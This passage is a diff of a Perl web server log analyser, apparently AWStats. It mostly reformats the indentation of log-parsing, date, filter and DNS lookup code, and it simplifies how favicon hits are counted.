@@ -10240,7 +10353,7 @@ if ( $QueryString =~ /lastline=(\d{14})/i ) {
 }
 if ($Debug) {
 	debug(
-		 "Last year=$lastyearbeforeupdate - Last month=$lastmonthbeforeupdate");
+		"Last year=$lastyearbeforeupdate - Last month=$lastmonthbeforeupdate");
 	debug("Last day=$lastdaybeforeupdate - Last hour=$lasthourbeforeupdate");
 	debug("LastLine=$LastLine");
 	debug("LastLineNumber=$LastLineNumber");
@@ -10263,12 +10376,11 @@ if ( $UpdateStats && $FrameName ne 'index' && $FrameName ne 'mainleft' )
 {    # Update only on index page or when not framed to avoid update twice
 
 	my %MonthNum = (
-					 "Jan", "01", "jan", "01", "Feb", "02", "feb", "02",
-					 "Mar", "03", "mar", "03", "Apr", "04", "apr", "04",
-					 "May", "05", "may", "05", "Jun", "06", "jun", "06",
-					 "Jul", "07", "jul", "07", "Aug", "08", "aug", "08",
-					 "Sep", "09", "sep", "09", "Oct", "10", "oct", "10",
-					 "Nov", "11", "nov", "11", "Dec", "12", "dec", "12"
+		"Jan", "01", "jan", "01", "Feb", "02", "feb", "02", "Mar", "03",
+		"mar", "03", "Apr", "04", "apr", "04", "May", "05", "may", "05",
+		"Jun", "06", "jun", "06", "Jul", "07", "jul", "07", "Aug", "08",
+		"aug", "08", "Sep", "09", "sep", "09", "Oct", "10", "oct", "10",
+		"Nov", "11", "nov", "11", "Dec", "12", "dec", "12"
 	  )
 	  ; # MonthNum must be in english because used to translate log date in apache log files
 
@@ -10292,14 +10404,13 @@ if ( $UpdateStats && $FrameName ne 'index' && $FrameName ne 'mainleft' )
 	}
 	elsif ( $DatabaseBreak eq 'day' ) {
 		$lastprocesseddate = sprintf( "%04i%02i%02i",
-									  $lastprocessedyear, $lastprocessedmonth,
-									  $lastprocessedday );
+			$lastprocessedyear, $lastprocessedmonth, $lastprocessedday );
 	}
 	elsif ( $DatabaseBreak eq 'hour' ) {
 		$lastprocesseddate = sprintf(
-									  "%04i%02i%02i%02i",
-									  $lastprocessedyear, $lastprocessedmonth,
-									  $lastprocessedday,  $lastprocessedhour
+			"%04i%02i%02i%02i",
+			$lastprocessedyear, $lastprocessedmonth,
+			$lastprocessedday,  $lastprocessedhour
 		);
 	}
 
@@ -10324,10 +10435,8 @@ if ( $UpdateStats && $FrameName ne 'index' && $FrameName ne 'mainleft' )
 	}
 	if ($Debug) {
 		debug(
-			   "RobotsSearchIDOrder has now "
-				 . @RobotsSearchIDOrder
-				 . " elements",
-			   1
+			"RobotsSearchIDOrder has now " . @RobotsSearchIDOrder . " elements",
+			1
 		);
 	}
 
@@ -10352,17 +10461,18 @@ if ( $UpdateStats && $FrameName ne 'index' && $FrameName ne 'mainleft' )
 	}
 	if ($Debug) {
 		debug(
-			   "SearchEnginesSearchIDOrder has now "
-				 . @SearchEnginesSearchIDOrder
-				 . " elements",
-			   1
+			"SearchEnginesSearchIDOrder has now "
+			  . @SearchEnginesSearchIDOrder
+			  . " elements",
+			1
 		);
 	}
 
 	# Complete HostAliases array
 	my $sitetoanalyze = quotemeta( lc($SiteDomain) );
 	if ( !@HostAliases ) {
-		warning(  "Warning: HostAliases parameter is not defined, $PROG choose \"$SiteDomain localhost 127.0.0.1\"."
+		warning(
+"Warning: HostAliases parameter is not defined, $PROG choose \"$SiteDomain localhost 127.0.0.1\"."
 		);
 		push @HostAliases, qr/^$sitetoanalyze$/i;
 		push @HostAliases, qr/^localhost$/i;
@@ -10380,8 +10490,9 @@ if ( $UpdateStats && $FrameName ne 'index' && $FrameName ne 'mainleft' )
 	@SkipDNSLookupFor = &OptimizeArray( \@SkipDNSLookupFor, 1 );
 	if ($Debug) {
 		debug(
-			 "SkipDNSLookupFor precompiled regex list is now @SkipDNSLookupFor",
-			 1 );
+			"SkipDNSLookupFor precompiled regex list is now @SkipDNSLookupFor",
+			1
+		);
 	}
 	@SkipHosts = &OptimizeArray( \@SkipHosts, 1 );
 	if ($Debug) {
@@ -10390,12 +10501,12 @@ if ( $UpdateStats && $FrameName ne 'index' && $FrameName ne 'mainleft' )
 	@SkipReferrers = &OptimizeArray( \@SkipReferrers, 1 );
 	if ($Debug) {
 		debug( "SkipReferrers precompiled regex list is now @SkipReferrers",
-			   1 );
+			1 );
 	}
 	@SkipUserAgents = &OptimizeArray( \@SkipUserAgents, 1 );
 	if ($Debug) {
 		debug( "SkipUserAgents precompiled regex list is now @SkipUserAgents",
-			   1 );
+			1 );
 	}
 	@SkipFiles = &OptimizeArray( \@SkipFiles, $URLNotCaseSensitive );
 	if ($Debug) {
@@ -10412,7 +10523,7 @@ if ( $UpdateStats && $FrameName ne 'index' && $FrameName ne 'mainleft' )
 	@OnlyUserAgents = &OptimizeArray( \@OnlyUserAgents, 1 );
 	if ($Debug) {
 		debug( "OnlyUserAgents precompiled regex list is now @OnlyUserAgents",
-			   1 );
+			1 );
 	}
 	@OnlyFiles = &OptimizeArray( \@OnlyFiles, $URLNotCaseSensitive );
 	if ($Debug) {
@@ -10446,20 +10557,20 @@ if ( $UpdateStats && $FrameName ne 'index' && $FrameName ne 'mainleft' )
 	if ($URLNotCaseSensitive) { $regdefault = qr/$defquoted$/i; }
 	else { $regdefault = qr/$defquoted$/; }
 	my $regipv4           = qr/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/;
-	my $regipv4l		  = qr/^::ffff:\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/;
+	my $regipv4l          = qr/^::ffff:\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/;
 	my $regipv6           = qr/^[0-9A-F]*:/i;
 	my $regvermsie        = qr/msie([+_ ]|)([\d\.]*)/i;
 	my $regvernetscape    = qr/netscape.?\/([\d\.]*)/i;
 	my $regverfirefox     = qr/firefox\/([\d\.]*)/i;
-	my $regveropera       = qr/opera\/([\d\.]*)/i;	
-	my $regversafari      = qr/safari\/([\d\.]*)/i;	
+	my $regveropera       = qr/opera\/([\d\.]*)/i;
+	my $regversafari      = qr/safari\/([\d\.]*)/i;
 	my $regverchrome      = qr/chrome\/([\d\.]*)/i;
-    my $regverkonqueror   = qr/konqueror\/([\d\.]*)/i;
+	my $regverkonqueror   = qr/konqueror\/([\d\.]*)/i;
 	my $regversvn         = qr/svn\/([\d\.]*)/i;
 	my $regvermozilla     = qr/mozilla(\/|)([\d\.]*)/i;
 	my $regnotie          = qr/webtv|omniweb|opera/i;
 	my $regnotnetscape    = qr/gecko|compatible|opera|galeon|safari|charon/i;
-    my $regnotfirefox     = qr/flock/i;
+	my $regnotfirefox     = qr/flock/i;
 	my $regnotsafari      = qr/arora|chrome|shiira/i;
 	my $regreferer        = qr/^(\w+):\/\/([^\/:]+)(:\d+|)/;
 	my $regreferernoquery = qr/^([^$URLQuerySeparators]+)/;
@@ -10479,7 +10590,7 @@ if ( $UpdateStats && $FrameName ne 'index' && $FrameName ne 'mainleft' )
 			 #if (! eval("use Socket;")) { error("Failed to load perl module Socket."); }
 			 #use Socket;
 			&Read_DNS_Cache( \%TmpDNSLookup, "$DNSLastUpdateCacheFile",
-							 "$FileSuffix", 0 )
+				"$FileSuffix", 0 )
 			  ;    # Load with no save into a second plugin file. Use FileSuffix
 		}
 	}
@@ -10527,7 +10638,8 @@ if ( $UpdateStats && $FrameName ne 'index' && $FrameName ne 'mainleft' )
 
 		# Try a direct seek access to save time
 		if ($Debug) {
-			debug(       "Try a direct access to LastLine=$LastLine, LastLineNumber=$LastLineNumber, LastLineOffset=$LastLineOffset, LastLineChecksum=$LastLineChecksum"
+			debug(
+"Try a direct access to LastLine=$LastLine, LastLineNumber=$LastLineNumber, LastLineOffset=$LastLineOffset, LastLineChecksum=$LastLineChecksum"
 			);
 		}
 		seek( LOG, $LastLineOffset, 0 );
@@ -10611,7 +10723,8 @@ if ( $UpdateStats && $FrameName ne 'index' && $FrameName ne 'mainleft' )
 				my $delay = &GetDelaySinceStart(0);
 				print "$NbOfLinesParsed lines processed ("
 				  . ( $delay > 0 ? $delay : 1000 ) . " ms, "
-				  . int(         1000 * $NbOfLinesShowsteps / ( $delay > 0 ? $delay : 1000 )
+				  . int(
+					1000 * $NbOfLinesShowsteps / ( $delay > 0 ? $delay : 1000 )
 				  )
 				  . " lines/second)\n";
 			}
@@ -10645,8 +10758,8 @@ if ( $UpdateStats && $FrameName ne 'index' && $FrameName ne 'mainleft' )
 					  . " (record format does not match LogFormat parameter): $line\n";
 				}
 			}
-			if (    $NbOfLinesParsed >= $NbOfLinesForCorruptedLog
-				 && $NbOfLinesParsed == $NbOfLinesCorrupted )
+			if (   $NbOfLinesParsed >= $NbOfLinesForCorruptedLog
+				&& $NbOfLinesParsed == $NbOfLinesCorrupted )
 			{
 				error( "Format error", $line, $LogFile );
 			}    # Exit with format error
@@ -10661,10 +10774,10 @@ if ( $UpdateStats && $FrameName ne 'index' && $FrameName ne 'mainleft' )
 			}
 			if ($Debug) {
 				debug(
-					   " Correct format line "
-						 . ( $lastlinenb + $NbOfLinesParsed )
-						 . ": $string",
-					   4
+					" Correct format line "
+					  . ( $lastlinenb + $NbOfLinesParsed )
+					  . ": $string",
+					4
 				);
 			}
 		}
@@ -10692,26 +10805,26 @@ if ( $UpdateStats && $FrameName ne 'index' && $FrameName ne 'mainleft' )
 		if (
 			$LogType eq 'W'
 			&& (
-				    $field[$pos_method] eq 'GET'
-				 || $field[$pos_method] eq 'POST'
-				 || $field[$pos_method] eq 'HEAD'
-				 || $field[$pos_method] eq 'PROPFIND'
-				 || $field[$pos_method] eq 'CHECKOUT'
-				 || $field[$pos_method] eq 'LOCK'
-				 || $field[$pos_method] eq 'PROPPATCH'
-				 || $field[$pos_method] eq 'OPTIONS'
-				 || $field[$pos_method] eq 'MKACTIVITY'
-				 || $field[$pos_method] eq 'PUT'
-				 || $field[$pos_method] eq 'MERGE'
-				 || $field[$pos_method] eq 'DELETE'
-				 || $field[$pos_method] eq 'REPORT'
-				 || $field[$pos_method] eq 'MKCOL'
-				 || $field[$pos_method] eq 'COPY'
-				 || $field[$pos_method] eq 'RPC_IN_DATA'
-				 || $field[$pos_method] eq 'RPC_OUT_DATA'
-				 || $field[$pos_method] eq 'OK'             # Webstar
-				 || $field[$pos_method] eq 'ERR!'           # Webstar
-				 || $field[$pos_method] eq 'PRIV'           # Webstar
+				   $field[$pos_method] eq 'GET'
+				|| $field[$pos_method] eq 'POST'
+				|| $field[$pos_method] eq 'HEAD'
+				|| $field[$pos_method] eq 'PROPFIND'
+				|| $field[$pos_method] eq 'CHECKOUT'
+				|| $field[$pos_method] eq 'LOCK'
+				|| $field[$pos_method] eq 'PROPPATCH'
+				|| $field[$pos_method] eq 'OPTIONS'
+				|| $field[$pos_method] eq 'MKACTIVITY'
+				|| $field[$pos_method] eq 'PUT'
+				|| $field[$pos_method] eq 'MERGE'
+				|| $field[$pos_method] eq 'DELETE'
+				|| $field[$pos_method] eq 'REPORT'
+				|| $field[$pos_method] eq 'MKCOL'
+				|| $field[$pos_method] eq 'COPY'
+				|| $field[$pos_method] eq 'RPC_IN_DATA'
+				|| $field[$pos_method] eq 'RPC_OUT_DATA'
+				|| $field[$pos_method] eq 'OK'             # Webstar
+				|| $field[$pos_method] eq 'ERR!'           # Webstar
+				|| $field[$pos_method] eq 'PRIV'           # Webstar
 			)
 		  )
 		{
@@ -10719,12 +10832,12 @@ if ( $UpdateStats && $FrameName ne 'index' && $FrameName ne 'mainleft' )
 # HTTP request.	Keep only GET, POST, HEAD, *OK* and ERR! for Webstar. Do not keep OPTIONS, TRACE
 		}
 		elsif (
-				( $LogType eq 'W' || $LogType eq 'S' )
-				&& (    $field[$pos_method] eq 'GET'
-					 || $field[$pos_method] eq 'mms'
-					 || $field[$pos_method] eq 'rtsp'
-					 || $field[$pos_method] eq 'http'
-					 || $field[$pos_method] eq 'RTP' )
+			( $LogType eq 'W' || $LogType eq 'S' )
+			&& (   $field[$pos_method] eq 'GET'
+				|| $field[$pos_method] eq 'mms'
+				|| $field[$pos_method] eq 'rtsp'
+				|| $field[$pos_method] eq 'http'
+				|| $field[$pos_method] eq 'RTP' )
 		  )
 		{
 
@@ -10735,20 +10848,20 @@ if ( $UpdateStats && $FrameName ne 'index' && $FrameName ne 'mainleft' )
 		# Mail request ('SMTP' for mail log with maillogconvert.pl preprocessor)
 		}
 		elsif (
-				$LogType eq 'F'
-				&& (    $field[$pos_method] eq 'RETR'
-					 || $field[$pos_method] eq 'o'
-					 || $field[$pos_method] =~ /$regget/o )
+			$LogType eq 'F'
+			&& (   $field[$pos_method] eq 'RETR'
+				|| $field[$pos_method] eq 'o'
+				|| $field[$pos_method] =~ /$regget/o )
 		  )
 		{
 
 			# FTP GET request
 		}
 		elsif (
-				$LogType eq 'F'
-				&& (    $field[$pos_method] eq 'STOR'
-					 || $field[$pos_method] eq 'i'
-					 || $field[$pos_method] =~ /$regsent/o )
+			$LogType eq 'F'
+			&& (   $field[$pos_method] eq 'STOR'
+				|| $field[$pos_method] eq 'i'
+				|| $field[$pos_method] =~ /$regsent/o )
 		  )
 		{
 
@@ -10772,8 +10885,8 @@ if ( $UpdateStats && $FrameName ne 'index' && $FrameName ne 'mainleft' )
 		 # DD/Month/YYYY:HH:MM:SS (Apache), DD/MM/YYYY HH:MM:SS, Mon DD HH:MM:SS
 		if ( !$dateparts[1] ) {    # Unix timestamp
 			(
-			   $dateparts[5], $dateparts[4], $dateparts[3],
-			   $dateparts[0], $dateparts[1], $dateparts[2]
+				$dateparts[5], $dateparts[4], $dateparts[3],
+				$dateparts[0], $dateparts[1], $dateparts[2]
 			  )
 			  = localtime( int( $field[$pos_date] ) );
 			$dateparts[1]++;
@@ -10834,11 +10947,8 @@ if ( $UpdateStats && $FrameName ne 'index' && $FrameName ne 'mainleft' )
 			  sprintf( "%04i%02i%02i", $yearrecord, $monthrecord, $dayrecord );
 		}
 		elsif ( $DatabaseBreak eq 'hour' ) {
-			$daterecord = sprintf(
-								   "%04i%02i%02i%02i",
-								   $yearrecord, $monthrecord,
-								   $dayrecord,  $hourrecord
-			);
+			$daterecord = sprintf( "%04i%02i%02i%02i",
+				$yearrecord, $monthrecord, $dayrecord, $hourrecord );
 		}
 
 		# TODO essayer de virer yearmonthrecord
@@ -10846,7 +10956,7 @@ if ( $UpdateStats && $FrameName ne 'index' && $FrameName ne 'mainleft' )
 		  sprintf( "$dateparts[2]%02i%02i", $dateparts[1], $dateparts[0] );
 		my $timerecord =
 		  ( ( int("$yearmonthdayrecord") * 100 + $dateparts[3] ) * 100 +
-			$dateparts[4] ) * 100 + $dateparts[5];
+			  $dateparts[4] ) * 100 + $dateparts[5];
 
 		# Check date
 		#-----------------------
@@ -10862,14 +10972,11 @@ if ( $UpdateStats && $FrameName ne 'index' && $FrameName ne 'mainleft' )
 			}
 			elsif ( $DatabaseBreak eq 'day' ) {
 				$daterecord = sprintf( "%04i%02i%02i",
-									   $yearrecord, $monthrecord, $dayrecord );
+					$yearrecord, $monthrecord, $dayrecord );
 			}
 			elsif ( $DatabaseBreak eq 'hour' ) {
-				$daterecord = sprintf(
-									   "%04i%02i%02i%02i",
-									   $yearrecord, $monthrecord,
-									   $dayrecord,  $hourrecord
-				);
+				$daterecord = sprintf( "%04i%02i%02i%02i",
+					$yearrecord, $monthrecord, $dayrecord, $hourrecord );
 			}
 
 			# TODO essayer de virer yearmonthrecord
@@ -10877,7 +10984,7 @@ if ( $UpdateStats && $FrameName ne 'index' && $FrameName ne 'mainleft' )
 			  sprintf( "$yearrecord%02i%02i", $dateparts[1], $dateparts[0] );
 			$timerecord =
 			  ( ( int("$yearmonthdayrecord") * 100 + $dateparts[3] ) * 100 +
-				$dateparts[4] ) * 100 + $dateparts[5];
+				  $dateparts[4] ) * 100 + $dateparts[5];
 		}
 		if ( $timerecord < 10000000000000 || $timerecord > $tomorrowtime ) {
 			$NbOfLinesCorrupted++;
@@ -10911,7 +11018,7 @@ if ( $UpdateStats && $FrameName ne 'index' && $FrameName ne 'mainleft' )
 			$NewLinePhase = 1;    # We will never enter here again
 			if ($ShowSteps) {
 				if ( $NbOfLinesShowsteps > 1
-					 && ( $NbOfLinesShowsteps & $NBOFLINESFORBENCHMARK ) )
+					&& ( $NbOfLinesShowsteps & $NBOFLINESFORBENCHMARK ) )
 				{
 					my $delay = &GetDelaySinceStart(0);
 					print ""
@@ -10919,7 +11026,7 @@ if ( $UpdateStats && $FrameName ne 'index' && $FrameName ne 'mainleft' )
 					  . " lines processed ("
 					  . ( $delay > 0 ? $delay : 1000 ) . " ms, "
 					  . int( 1000 * ( $NbOfLinesShowsteps - 1 ) /
-							 ( $delay > 0 ? $delay : 1000 ) )
+						  ( $delay > 0 ? $delay : 1000 ) )
 					  . " lines/second)\n";
 				}
 				&GetDelaySinceStart(1);
@@ -10944,7 +11051,7 @@ if ( $UpdateStats && $FrameName ne 'index' && $FrameName ne 'mainleft' )
 # Here, field array, timerecord and yearmonthdayrecord are initialized for log record
 		if ($Debug) {
 			debug( "  This is a not already processed record ($timerecord)",
-				   4 );
+				4 );
 		}
 
 		# We found a new line
@@ -10955,9 +11062,9 @@ if ( $UpdateStats && $FrameName ne 'index' && $FrameName ne 'mainleft' )
 
 		# Skip for some client host IP addresses, some URLs, other URLs
 		if (
-			 @SkipHosts
-			 && ( &SkipHost( $field[$pos_host] )
-				  || ( $pos_hostr && &SkipHost( $field[$pos_hostr] ) ) )
+			@SkipHosts
+			&& ( &SkipHost( $field[$pos_host] )
+				|| ( $pos_hostr && &SkipHost( $field[$pos_hostr] ) ) )
 		  )
 		{
 			$qualifdrop =
@@ -10969,23 +11076,23 @@ if ( $UpdateStats && $FrameName ne 'index' && $FrameName ne 'mainleft' )
 			$qualifdrop =
 "Dropped record (URL $field[$pos_url] not qualified by SkipFiles)";
 		}
-		elsif (    @SkipUserAgents
-				&& $pos_agent >= 0
-				&& &SkipUserAgent( $field[$pos_agent] ) )
+		elsif (@SkipUserAgents
+			&& $pos_agent >= 0
+			&& &SkipUserAgent( $field[$pos_agent] ) )
 		{
 			$qualifdrop =
 "Dropped record (user agent '$field[$pos_agent]' not qualified by SkipUserAgents)";
 		}
-		elsif (    @SkipReferrers
-				&& $pos_referer >= 0
-				&& &SkipReferrer( $field[$pos_referer] ) )
+		elsif (@SkipReferrers
+			&& $pos_referer >= 0
+			&& &SkipReferrer( $field[$pos_referer] ) )
 		{
 			$qualifdrop =
 "Dropped record (URL $field[$pos_referer] not qualified by SkipReferrers)";
 		}
-		elsif (    @OnlyHosts
-				&& !&OnlyHost( $field[$pos_host] )
-				&& ( !$pos_hostr || !&OnlyHost( $field[$pos_hostr] ) ) )
+		elsif (@OnlyHosts
+			&& !&OnlyHost( $field[$pos_host] )
+			&& ( !$pos_hostr || !&OnlyHost( $field[$pos_hostr] ) ) )
 		{
 			$qualifdrop =
 			    "Dropped record (host $field[$pos_host]"
@@ -11045,14 +11152,11 @@ if ( $UpdateStats && $FrameName ne 'index' && $FrameName ne 'mainleft' )
 			}
 			elsif ( $DatabaseBreak eq 'day' ) {
 				$lastprocesseddate = sprintf( "%04i%02i%02i",
-										$yearrecord, $monthrecord, $dayrecord );
+					$yearrecord, $monthrecord, $dayrecord );
 			}
 			elsif ( $DatabaseBreak eq 'hour' ) {
-				$lastprocesseddate = sprintf(
-											  "%04i%02i%02i%02i",
-											  $yearrecord, $monthrecord,
-											  $dayrecord,  $hourrecord
-				);
+				$lastprocesseddate = sprintf( "%04i%02i%02i%02i",
+					$yearrecord, $monthrecord, $dayrecord, $hourrecord );
 			}
 		}
 
@@ -11083,10 +11187,10 @@ if ( $UpdateStats && $FrameName ne 'index' && $FrameName ne 'mainleft' )
 			$standalonequery = $2 || '';
 
 # For IIS setup, if pos_query is enabled we need to combine the URL to query strings
-			if (    !$foundparam
-				 && $pos_query >= 0
-				 && $field[$pos_query]
-				 && $field[$pos_query] ne '-' )
+			if (   !$foundparam
+				&& $pos_query >= 0
+				&& $field[$pos_query]
+				&& $field[$pos_query] ne '-' )
 			{
 				$foundparam      = 1;
 				$tokenquery      = '?';
@@ -11155,9 +11259,9 @@ if ( $UpdateStats && $FrameName ne 'index' && $FrameName ne 'mainleft' )
 			$standalonequery = $2 || '';
 
 	# For IIS setup, if pos_query is enabled we need to use it for query strings
-			if (    $pos_query >= 0
-				 && $field[$pos_query]
-				 && $field[$pos_query] ne '-' )
+			if (   $pos_query >= 0
+				&& $field[$pos_query]
+				&& $field[$pos_query] ne '-' )
 			{
 				$tokenquery      = '?';
 				$standalonequery = $field[$pos_query];
@@ -11258,28 +11362,19 @@ if ( $UpdateStats && $FrameName ne 'index' && $FrameName ne 'mainleft' )
 			if ($foundparam) { $_misc_h{"TotalMisc"}++; }
 		}
 
-		# Analyze: favicon (=> countedtraffic=1 if favicon)
+		# Analyze: successful favicon (=> countedtraffic=1 if favicon)
 		#--------------------------------------------------
-		if (    $pos_referer >= 0
-			 && $field[$pos_referer]
-			 && $urlwithnoquery =~ /$regfavico/o )
+		if ($urlwithnoquery =~ /$regfavico/o)
 		{
-			if (
-				 (
-				      $field[$pos_code] != 404
-				   || $urlwithnoquery !~ /\/.+\/favicon\.ico$/i
-				 )
-				 && ( $field[$pos_agent] =~ /MSIE/ )
-			  )
-			{
-
-# We don't count one hit if (not on root and error) and MSIE
-# If error not on root, another hit will be made on root. If not MSIE, hit are made not only for "Adding".
-				$_misc_h{'AddToFavourites'}
-				  ++;    # Hit on favicon on root or without error, we count it
+			if ($field[$pos_code] != 404) {
+				$_misc_h{'AddToFavourites'}++;
 			}
 			$countedtraffic =
 			  1;    # favicon is a case that must not be counted anywhere else
+			$_time_nv_h[$hourrecord]++;
+			if ($field[$pos_code] != 404) {
+				$_time_nv_k[$hourrecord] += int( $field[$pos_size] );
+			}
 		}
 
 		# Analyze: Worms (=> countedtraffic=2 if worm)
@@ -11331,7 +11426,7 @@ if ( $UpdateStats && $FrameName ne 'index' && $FrameName ne 'mainleft' )
 					   # This is an error code which referrer need to be tracked
 							my $newurl =
 							  substr( $field[$pos_url], 0,
-									  $MaxLengthOfStoredURL );
+								$MaxLengthOfStoredURL );
 							$newurl =~ s/[$URLQuerySeparators].*$//;
 							$_sider404_h{$newurl}++;
 							if ( $pos_referer >= 0 ) {
@@ -11360,8 +11455,9 @@ if ( $UpdateStats && $FrameName ne 'index' && $FrameName ne 'mainleft' )
 				if ( !$ValidSMTPCodes{ $field[$pos_code] } )
 				{                          # Code is not valid
 					$_errors_h{ $field[$pos_code] }++;
-					if ($field[$pos_size] ne '-') {
-						$_errors_k{$field[$pos_code]}+=int($field[$pos_size]);
+					if ( $field[$pos_size] ne '-' ) {
+						$_errors_k{ $field[$pos_code] } +=
+						  int( $field[$pos_size] );
 					}
 					if ($Debug) {
 						debug(
@@ -11372,8 +11468,8 @@ if ( $UpdateStats && $FrameName ne 'index' && $FrameName ne 'mainleft' )
 					$countedtraffic = 3;
 					if ($PageBool) { $_time_nv_p[$hourrecord]++; }
 					$_time_nv_h[$hourrecord]++;
-					if ($field[$pos_size] ne '-') {
-						$_time_nv_k[$hourrecord]+=int($field[$pos_size]);
+					if ( $field[$pos_size] ne '-' ) {
+						$_time_nv_k[$hourrecord] += int( $field[$pos_size] );
 					}
 				}
 			}
@@ -11427,8 +11523,8 @@ if ( $UpdateStats && $FrameName ne 'index' && $FrameName ne 'mainleft' )
 								);
 							}
 							$_robot_h{$uarobot}++;
-							if ($field[$pos_size] ne '-') {
-								$_robot_k{$uarobot}+=int($field[$pos_size]);
+							if ( $field[$pos_size] ne '-' ) {
+								$_robot_k{$uarobot} += int( $field[$pos_size] );
 							}
 							$_robot_l{$uarobot} = $timerecord;
 							if ( $urlwithnoquery =~ /$regrobot/o ) {
@@ -11437,8 +11533,9 @@ if ( $UpdateStats && $FrameName ne 'index' && $FrameName ne 'mainleft' )
 							$countedtraffic = 4;
 							if ($PageBool) { $_time_nv_p[$hourrecord]++; }
 							$_time_nv_h[$hourrecord]++;
-							if ($field[$pos_size] ne '-') {
-								$_time_nv_k[$hourrecord]+=int($field[$pos_size]);
+							if ( $field[$pos_size] ne '-' ) {
+								$_time_nv_k[$hourrecord] +=
+								  int( $field[$pos_size] );
 							}
 						}
 					}
@@ -11488,12 +11585,13 @@ if ( $UpdateStats && $FrameName ne 'index' && $FrameName ne 'mainleft' )
 		if ( !$countedtraffic ) {
 			if ($LevelForFileTypesDetection) {
 				$_filetypes_h{$extension}++;
-				if ($field[$pos_size] ne '-') {
-					$_filetypes_k{$extension}+=int($field[$pos_size]);
+				if ( $field[$pos_size] ne '-' ) {
+					$_filetypes_k{$extension} += int( $field[$pos_size] );
 				}
-				                               # Compression
+
+				# Compression
 				if ( $pos_gzipin >= 0 && $field[$pos_gzipin] )
-				{                              # If in and out in log
+				{    # If in and out in log
 					my ( $notused, $in ) = split( /:/, $field[$pos_gzipin] );
 					my ( $notused1, $out, $notused2 ) =
 					  split( /:/, $field[$pos_gzipout] );
@@ -11503,14 +11601,14 @@ if ( $UpdateStats && $FrameName ne 'index' && $FrameName ne 'mainleft' )
 					}
 				}
 				elsif ( $pos_compratio >= 0
-						&& ( $field[$pos_compratio] =~ /(\d+)/ ) )
+					&& ( $field[$pos_compratio] =~ /(\d+)/ ) )
 				{    # Calculate in/out size from percentage
 					if ( $fieldlib[$pos_compratio] eq 'gzipratio' ) {
 
 	# with mod_gzip:    % is size (before-after)/before (low for jpg) ??????????
 						$_filetypes_gz_in{$extension} +=
 						  int(
-							  $field[$pos_size] * 100 / ( ( 100 - $1 ) || 1 ) );
+							$field[$pos_size] * 100 / ( ( 100 - $1 ) || 1 ) );
 					}
 					else {
 
@@ -11539,8 +11637,8 @@ if ( $UpdateStats && $FrameName ne 'index' && $FrameName ne 'mainleft' )
 				$LastTime{$lastprocesseddate} = $timerecord;
 				$DayPages{$yearmonthdayrecord}++;
 				$_url_p{ $field[$pos_url] }++;   #Count accesses for page (page)
-				if ($field[$pos_size] ne '-') {
-					$_url_k{$field[$pos_url]}+=int($field[$pos_size]);
+				if ( $field[$pos_size] ne '-' ) {
+					$_url_k{ $field[$pos_url] } += int( $field[$pos_size] );
 				}
 				$_time_p[$hourrecord]++;    #Count accesses for hour (page)
 				                            # TODO Use an id for hash key of url
@@ -11548,16 +11646,17 @@ if ( $UpdateStats && $FrameName ne 'index' && $FrameName ne 'mainleft' )
 			}
 			$_time_h[$hourrecord]++;
 			$DayHits{$yearmonthdayrecord}++;    #Count accesses for hour (hit)
-			if ($field[$pos_size] ne '-') {
-				$_time_k[$hourrecord]+=int($field[$pos_size]);
-	 			$DayBytes{$yearmonthdayrecord}+=int($field[$pos_size]);	#Count accesses for hour (kb)
+			if ( $field[$pos_size] ne '-' ) {
+				$_time_k[$hourrecord]          += int( $field[$pos_size] );
+				$DayBytes{$yearmonthdayrecord} +=
+				  int( $field[$pos_size] );     #Count accesses for hour (kb)
 			}
 
 			# Analyze: Login
 			#---------------
-			if (    $pos_logname >= 0
-				 && $field[$pos_logname]
-				 && $field[$pos_logname] ne '-' )
+			if (   $pos_logname >= 0
+				&& $field[$pos_logname]
+				&& $field[$pos_logname] ne '-' )
 			{
 				$field[$pos_logname] =~
 				  s/ /_/g;    # This is to allow space in logname
@@ -11590,11 +11689,11 @@ if ( $UpdateStats && $FrameName ne 'index' && $FrameName ne 'mainleft' )
 		if ( !$countedtraffic ) {
 			my $ip = 0;
 			if ($DNSLookup) {    # DNS lookup is 1 or 2
-				if ($Host =~ /$regipv4l/o) { 	# IPv4 lighttpd
+				if ( $Host =~ /$regipv4l/o ) {    # IPv4 lighttpd
 					$Host =~ s/^::ffff://;
 					$ip = 4;
 				}
-				elsif ($Host =~ /$regipv4/o) { $ip=4; }	# IPv4
+				elsif ( $Host =~ /$regipv4/o ) { $ip = 4; }    # IPv4
 				elsif ( $Host =~ /$regipv6/o ) { $ip = 6; }    # IPv6
 				if ($ip) {
 
@@ -11626,12 +11725,12 @@ if ( $UpdateStats && $FrameName ne 'index' && $FrameName ne 'mainleft' )
 								if ( $ip == 4 ) {
 									my $lookupresult =
 									  gethostbyaddr(
-											 pack( "C4", split( /\./, $Host ) ),
-											 AF_INET )
+										pack( "C4", split( /\./, $Host ) ),
+										AF_INET )
 									  ; # This is very slow, may spend 20 seconds
-									if (    !$lookupresult
-										 || $lookupresult =~ /$regipv4/o
-										 || !IsAscii($lookupresult) )
+									if (   !$lookupresult
+										|| $lookupresult =~ /$regipv4/o
+										|| !IsAscii($lookupresult) )
 									{
 										$TmpDNSLookup{$Host} = $HostResolved =
 										  '*';
@@ -11649,12 +11748,12 @@ if ( $UpdateStats && $FrameName ne 'index' && $FrameName ne 'mainleft' )
 								}
 								elsif ( $ip == 6 ) {
 									if ( $PluginsLoaded{'GetResolvedIP'}
-										 {'ipv6'} )
+										{'ipv6'} )
 									{
 										my $lookupresult =
 										  GetResolvedIP_ipv6($Host);
-										if (    !$lookupresult
-											 || !IsAscii($lookupresult) )
+										if (   !$lookupresult
+											|| !IsAscii($lookupresult) )
 										{
 											$TmpDNSLookup{$Host} =
 											  $HostResolved = '*';
@@ -11667,7 +11766,8 @@ if ( $UpdateStats && $FrameName ne 'index' && $FrameName ne 'mainleft' )
 									else {
 										$TmpDNSLookup{$Host} = $HostResolved =
 										  '*';
-										warning(                          "Reverse DNS lookup for $Host not available without ipv6 plugin enabled."
+										warning(
+"Reverse DNS lookup for $Host not available without ipv6 plugin enabled."
 										);
 									}
 								}
@@ -11696,8 +11796,15 @@ if ( $UpdateStats && $FrameName ne 'index' && $FrameName ne 'mainleft' )
 				}
 			}
 			else {
-				if ($Host =~ /$regipv4l/o) { $Host =~ s/^::ffff://; $HostResolved='*'; $ip=4; }
